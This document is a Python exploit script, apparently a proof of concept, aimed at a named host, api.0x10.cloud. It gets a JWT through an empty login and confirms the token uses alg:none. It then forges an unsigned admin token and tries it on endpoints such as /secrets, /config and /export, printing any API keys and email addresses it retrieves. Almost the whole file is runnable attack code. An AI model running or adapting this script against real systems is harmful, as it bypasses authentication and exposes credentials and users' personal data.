# ============================================================
# Author:           Yash Zinzuvadiya
# Vulnerability:    JWT Algorithm None Attack — Full Admin Access
#                   + API Key Exposure
# Target:           api.0x10.cloud
# Description:      The /auth endpoint accepts empty credentials
#                   and returns a JWT signed with alg:none.
#                   This allows forging admin tokens without any
#                   secret key, exposing sensitive user data and
#                   API keys from all authenticated endpoints.
# ============================================================

import urllib.request
import urllib.error
import urllib.parse
import json
import base64
import time

TARGET = "http://api.0x10.cloud"

# ── Step 1: Get JWT via empty login ─────────────────────────
print("=" * 60)
print("  STEP 1: Empty Login Auth Bypass")
print("=" * 60)

def post_json(url, data):
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST"
    )
    try:
        r = urllib.request.urlopen(req, timeout=5)
        return r.status, r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="ignore")
    except Exception as e:
        return None, str(e)

# Try empty credentials on /auth endpoint
status, body = post_json(TARGET + "/auth", {})
print(f"[*] POST {TARGET}/auth with empty body")
print(f"[*] Status: {status}")
print(f"[*] Response: {body}")

token = None
if "token" in body:
    token = json.loads(body).get("token")
    print(f"\n[VULNERABILITY] Empty login returned JWT token!")
    print(f"[*] Token: {token}")

# ── Step 2: Decode the JWT to inspect alg and payload ───────
print("\n" + "=" * 60)
print("  STEP 2: Decode JWT — Detect alg:none")
print("=" * 60)

def decode_jwt_part(part):
    # Add padding back
    padding = 4 - len(part) % 4
    part += "=" * padding
    return json.loads(base64.b64decode(part).decode("utf-8"))

if token:
    parts = token.split(".")
    header  = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    print(f"[*] JWT Header:  {json.dumps(header)}")
    print(f"[*] JWT Payload: {json.dumps(payload)}")

    if header.get("alg") == "none":
        print(f"\n[VULNERABILITY] JWT uses alg:none — no signature verification!")
        print(f"[*] This means tokens can be forged without any secret key.")
        print(f"[*] Payload shows role: {payload.get('role')} — admin access confirmed.")

# ── Step 3: Forge an admin JWT with alg:none ────────────────
print("\n" + "=" * 60)
print("  STEP 3: Forge Admin JWT Token")
print("=" * 60)

def forge_jwt(header_data, payload_data):
    def b64encode_no_padding(data):
        return base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
    h = b64encode_no_padding(header_data)
    p = b64encode_no_padding(payload_data)
    return f"{h}.{p}."  # empty signature

forged_header  = {"alg": "none", "typ": "JWT"}
forged_payload = {"sub": "1", "name": "Admin", "role": "admin", "iat": 9999999999}
forged_token   = forge_jwt(forged_header, forged_payload)

print(f"[*] Forged Header:  {json.dumps(forged_header)}")
print(f"[*] Forged Payload: {json.dumps(forged_payload)}")
print(f"[*] Forged Token:   {forged_token}")

# ── Step 4: Use forged token to access protected endpoints ──
print("\n" + "=" * 60)
print("  STEP 4: Access Protected Endpoints with Forged Token")
print("=" * 60)

endpoints = [
    "/users", "/users/all", "/admin", "/config",
    "/secrets", "/data", "/logs", "/debug", "/internal", "/export"
]

for ep in endpoints:
    req = urllib.request.Request(
        TARGET + ep,
        headers={
            "Authorization": f"Bearer {forged_token}",
            "Content-Type": "application/json"
        }
    )
    try:
        r = urllib.request.urlopen(req, timeout=5)
        body = r.read().decode("utf-8", errors="ignore")
        print(f"[200 OPEN] {ep}")
        print(f"  Response: {body[:300]}")
        if "api_key" in body:
            print(f"  [CRITICAL] API key exposed: {json.loads(body).get('api_key')}")
        if "email" in body:
            print(f"  [CRITICAL] Email exposed: {json.loads(body).get('email')}")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        print(f"[{e.code}] {ep}")
    except Exception as e:
        print(f"[ERR] {ep} — {e}")
    time.sleep(0.15)

print("\n" + "=" * 60)
print("  SUMMARY")
print("=" * 60)
print("  Target:       api.0x10.cloud")
print("  Vulnerability: JWT Algorithm None Attack")
print("  Impact:        Complete authentication bypass.")
print("                 Forged admin tokens accepted by all endpoints.")
print("                 Admin API keys and user data fully exposed.")
print("  Modules used:  urllib.request, urllib.error, json, base64, time")
print("=" * 60)
